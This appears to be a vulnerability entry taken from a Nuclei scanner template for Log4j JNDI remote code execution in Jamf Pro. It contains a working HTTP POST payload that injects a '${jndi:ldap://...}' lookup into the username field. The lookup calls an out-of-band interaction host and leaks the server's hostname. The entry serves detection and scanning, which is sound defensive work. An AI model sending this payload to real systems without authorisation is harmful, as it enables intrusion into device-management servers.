# Vulnerability: JamF Pro - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`jamf-pro-log4j-rce.yaml`)

## Description
JamF is susceptible to Lof4j JNDI remote code execution. JamF is the industry standard when it comes to the management of iOS devices (iPhones and iPads), macOS computers (MacBooks, iMacs, etc.), and tvOS devices (Apple TV).

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&password=
```

